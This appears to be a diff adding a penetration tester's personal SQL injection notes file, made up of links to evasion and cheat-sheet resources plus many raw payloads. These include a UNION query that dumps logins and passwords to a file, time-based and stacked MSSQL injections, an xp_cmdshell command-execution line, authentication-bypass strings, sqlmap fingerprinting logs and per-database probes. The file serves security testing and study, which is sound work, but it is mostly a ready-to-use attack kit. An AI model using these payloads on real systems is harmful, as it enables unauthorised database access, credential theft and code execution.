@@ -1,0 +1,244 @@
+# sqli
+
+# detection summary
+http://www.arneswinnen.net/2013/09/automated-sql-injection-detection/
+
+# evasion
+https://github.com/client9/libinjection/blob/master/data/sqli-rsalgado-bhusa2013.txt # good tricks
+http://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
+https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF
+https://websec.files.wordpress.com/2010/11/sqli2.pdf
+
+# test sql 
+http://sqlfiddle.com/
+
+# cheatsheets
+http://www.sqlinjectionwiki.com/
+http://www.websec.ca/kb/sql_injection (was https://docs.google.com/document/d/1rO_LCBKJY0puvRhPhAfTD2iNVPfR4e9KiKDpDE2enMI/edit#heading=h.7343208e65c0)
+https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
+http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/
+http://pentestmonkey.net/category/cheat-sheet/sql-injection
+http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html
+sqli-cheatsheets
+
+# a lot of articles on sqli
+https://delicious.com/inquis/sqlinjection
+
+# tips
+?id=1 limit 0 union select login,password from users into outfile '/tmp/users'
+outfile OR dumpfile
+concat() OR concat_ws() OR group_concat() (all lines in one line)
+always use UNION ALL in order to preserve duplicate rows
+
+select top 1 (ou 2) 0,1,table_name COLLATE DATABASE_DEFAULT,2,3...
+ ou bien essayer:
+from thetable limit 1
+
+http://websec.ca/blog/view/Bypassing_WAFs_with_SQLMap
+
+twitter: "You can use %82 on MySQL 5 as a replacement for %2C when performing SQL injections"
+
+# extract the current running query
+http://www.contextis.com/resources/blog/sql-inception-how-select-yourself/
+
+# sqli labs
+https://github.com/Audi-1/sqli-labs
+
+# detect/confirm
+MySQL: 'serv' 'ices' / concat('adm','in')
+MSSQL: 'serv'+'ices'
+Oracle: 'serv'||'ices'
+Postgres: 'serv'||'ices'
+
+# time
+* MSSQL
+a' waitfot delay '0:0:10'--
+
+# stacked
+* MSSQL
+abc';waitfor delay '0:0:10'--
+123;exec xp_cmdshell 'ping 1.1.1.1';select 1 from (select 2 login) users // SELECT * FROM users WHERE login=$input ORDER BY login ASC
+
+# sqli optimisation using Range:
+-m POST -H 'Range: bytes=-1' -i 200
+
+# web for pentester II
+select * from users where username = 'doesntexist' or 'a'='a' and password = 'nobodyusedthispw' -> ( False ) OR ( True AND False) -> 0 result
+' or 'a'='a' limit 0,1 --%20
+username=asdf\&password=+and+'a'='a -> username = 'asdf\' and password=' and 'a'='a'
+&limit=4+procedure+analyse()
+&group=id+..
+
+## fingerprint db
+* sqlmap
+[11:41:18] [PAYLOAD] 1 AND (SELECT CHR(99)&CHR(72)&CHR(108)&CHR(79) FROM MSysAccessObjects)=CHR(99)&CHR(72)&CHR(108)&CHR(79)
+[11:41:18] [PAYLOAD] 1 AND (SELECT CHR(99)||CHR(72)||CHR(108)||CHR(79) FROM SYSIBM.SYSDUMMY1)=CHR(99)||CHR(72)||CHR(108)||CHR(79)
+[11:41:18] [PAYLOAD] 1 AND (SELECT 'cHlO' FROM RDB$DATABASE)='cHlO'
+[11:41:18] [PAYLOAD] 1 AND (SELECT 'cHlO' FROM VERSIONS)='cHlO'
+[11:41:18] [PAYLOAD] 1 AND (SELECT CHAR(99)+CHAR(72)+CHAR(108)+CHAR(79))=CHAR(99)+CHAR(72)+CHAR(108)+CHAR(79)
+[11:41:18] [PAYLOAD] 1 AND (SELECT 0x63486c4f)=0x63486c4f
+[11:41:18] [PAYLOAD] 1 AND (SELECT CHR(99)||CHR(72)||CHR(108)||CHR(79) FROM DUAL)=CHR(99)||CHR(72)||CHR(108)||CHR(79)
+[11:41:18] [PAYLOAD] 1 AND (SELECT CHR(99)||CHR(72)||CHR(108)||CHR(79) FROM DUAL)=CHR(70)||CHR(114)||CHR(118)||CHR(71)
+
+* https://rdot.org/forum/showthread.php?t=118
+
+MySQL
+id=1+procedure+analyse()
+id=1+and+concat_ws(1,1)=1
+id=1+and+connection_id()=connection_id()
+
+MSSQL
+id=1+and+len(@@version)=len(@@version)
+id=1+and+(@@TEXTSIZE>@@LANGID)
+
+PostgerSQL
+id=1+and+1=1::int // Informix тоже держит такой синтаксис, но она крайне редка, так что пока оставлю
+id=1+and+pg_backend_pid()=pg_backend_pid()
+id=1+and+5432=inet_server_port()
+
+Access
+id=1+and+1=StrConv(1,1)
+id=1+and+Sgn(1)=Sgn(1)
+
+Oracle
+id=1+and+instr4(1,1,1,1)=1
+id=1+and+rownum=rownum
+
+Sybase
+id=1+and+inttohex(10)=inttohex(10) // не уверен в уникальности, вроде прошарил гугл, но не факт
+
+Interbase/Firebird (tnx Corwin)
+id=1+and+GEN_UUID()!=GEN_UUID()
+(uuid_to_char() и char_to_uuid()) // Firebird начиная с версии 2.5
+id=1+and+UUID_TO_CHAR(GEN_UUID())!=UUID_TO_CHAR(GE N_UUID())
+
+* https://rdot.org/forum/showthread.php?t=118&page=7 (more)
+
+MySQL (>=3.*)
+id=1 and concat_ws(1,1)
+id=1 and connection_id()
+id=1 and inet_aton(1)
+id=1 and password(1)
+id=1 and inet_ntoa(111111111)
+id=1 and field(1,1)
+id=1 and elt(1,1)
+id=1 and curdate()
+id=1 and find_in_set(1,1)
+id=1 and make_set(1,1)
+id=1 and export_set(1,1,1)
+
+MSSQL (>=2000)
+id=1 and CHECKSUM(1)=CHECKSUM(1)
+id=1 and QUOTENAME(1)=QUOTENAME(1)
+id=1 and APP_NAME()=APP_NAME()
+id=1 and PERMISSIONS()=PERMISSIONS()
+id=1 and ROWCOUNT_BIG()=ROWCOUNT_BIG()
+
+sqlmap/plugins/dbms/mssqlserver/fingerprint.py:
+  for version, check in (("2000", "HOST_NAME()=HOST_NAME()"), \
+                         ("2005", "XACT_STATE()=XACT_STATE()"), \
+                         ("2008", "SYSDATETIME()=SYSDATETIME()"), \
+                         ("2012", "CONCAT(NULL,NULL)=CONCAT(NULL,NULL)")):
+
+PostgreSQL (>=7.4)
+id=1 and pg_client_encoding()=pg_client_encoding()
+id=1 and split_part(chr(1),chr(1),1)=split_part(chr(1),chr( 1),1)
+id=1 and quote_literal(chr(1))=quote_literal(chr(1))
+id=1 and quote_ident(chr(1))=quote_ident(chr(1))
+id=1 and string_to_array(chr(1),chr(1))=string_to_array(chr (1),chr(1))
+
+DB2 (>=8)
+id=1 and GRAPHIC(1)=GRAPHIC(1)
+id=1 and DOUBLE_PRECISION(1)=DOUBLE_PRECISION(1)
+id=1 and MULTIPLY_ALT(1,1)=MULTIPLY_ALT(1,1)
+id=1 and JULIAN_DAY(CURRENT_DATE)=JULIAN_DAY(CURRENT_DATE)
+id=1 and GENERATE_UNIQUE()!=GENERATE_UNIQUE()
+id=1 and MIDNIGHT_SECONDS(current_time)=MIDNIGHT_SECONDS(current_time)
+id=1 and dbclob('1')=dbclob('1')
+id=1 and blob('1')=blob('1')
+id=1 and clob('1')=clob('1')
+
+SQLite
+id=1 and last_insert_rowid() (>=2.4.7)
+id=1 and zeroblob(1)=zeroblob(1)
+id=1 and total_changes()
+id=1 and sqlite_version()
+id=1 and sqlite_compileoption_get(1)=sqlite_compileoption_get(1)
+id=1 and sqlite_compileoption_used(1)=sqlite_compileoption_ used(1)
+id=1 and sqlite_source_id()
+id=1 and changes()
+id=1 and glob(1,1)
+
+Firebird (>=2.1)
+id=1 and GEN_UUID()!=GEN_UUID()
+id=1 and BIN_SHL(1,1)=BIN_SHL(1,1)
+id=1 and BIN_SHR(1,1)=BIN_SHR(1,1)
+id=1 and ASCII_CHAR(1)=ASCII_CHAR(1)
+
+Ingres (>=9.2)
+id=1 and VARBYTE(1)=VARBYTE(1)
+id=1 and BYTEEXTRACT(1,1)=BYTEEXTRACT(1,1)
+id=1 and SQUEEZE(1)=SQUEEZE(1)
+id=1 and _TIME(1)=_TIME(1)
+id=1 and UUID_CREATE()!=UUID_CREATE()
+
+Oracle (>=8.1.5)
+id=1 and instrb(1,1)=1
+id=1 and lengthb(1)=1
+id=1 and rawtohex(1)=rawtohex(1)
+id=1 and hextoraw(1)=hextoraw(1)
+id=1 and TO_MULTI_BYTE(1)=TO_MULTI_BYTE(1)
+id=1 and TO_SINGLE_BYTE(1)=TO_SINGLE_BYTE(1)
+id=1 and SYS_GUID()!=SYS_GUID()
+id=1 and NLS_CHARSET_NAME(1)=NLS_CHARSET_NAME(1)
+
+Access (>=2003)
+id=1 and choose(1,1)
+id=1 and InstrRev(1,1)
+id=1 and StrConv(1,1)
+id=1 and Sgn(1)
+id=1 and DateSerial(1,1,1)
+id=1 and TimeSerial(1,1,1)
+id=1 and CVar(1)
+id=1 and CCur(1)
+id=1 and CInt(1)
+
+Informix (>=10)
+id=1 and DBSERVERNAME=DBSERVERNAME
+id=1 and SITENAME=SITENAME
+id=1 and MDY(1,1,1)=MDY(1,1,1)
+id=1 and ROOT(1)=ROOT(1)
+
+Sybase (>=10)
+id=1 and COUNT_SET_BITS(1)=1
+id=1 and EVENT_CONDITION_NAME(1)=EVENT_CONDITION_NAME(1)
+id=1 and LESSER(1,1)=LESSER(1,1)
+id=1 and NEXT_CONNECTION(0)=NEXT_CONNECTION(0)
+id=1 and PROPERTY_NAME(1)=PROPERTY_NAME(1)
+id=1 and TRUNCNUM(1,1)=TRUNCNUM(1,1)
+id=1 and YMD(1,1,1)=YMD(1,1,1)
+
+# types
+Authentication Bypass
+Data Extraction
+    Error based
+    Union based
+    Blind SQLi
+    DNS Exfiltration
+    Bypass WAF/Black Listing
+Advanced Exploitation
+    File read/write
+    Code execution
+Advanced Identification/Exploitation
+    Order by/group by
+    Double Encoding/decoding
+    Injection in Insert/Update
+    Other HTTP fields
+    Injection in stored procedures
+    2nd order Injections
+    GBK encoding
+    UTF-7 decoding
+    Truncation issues
+
+# recommendations
+http://bobby-tables.com/
